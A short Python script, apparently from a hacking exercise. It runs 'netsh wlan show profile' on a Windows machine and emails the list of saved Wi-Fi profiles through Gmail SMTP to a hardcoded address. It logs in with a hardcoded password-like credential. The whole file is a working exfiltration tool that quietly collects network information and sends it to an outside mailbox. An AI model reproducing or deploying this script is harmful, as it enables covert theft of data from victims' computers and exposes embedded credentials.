#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
send_mail("johnnybelly1324@gmail.com", "B7JRvOQuD8amwIlHKBghR7osQx895pMInzYdO17d", result)
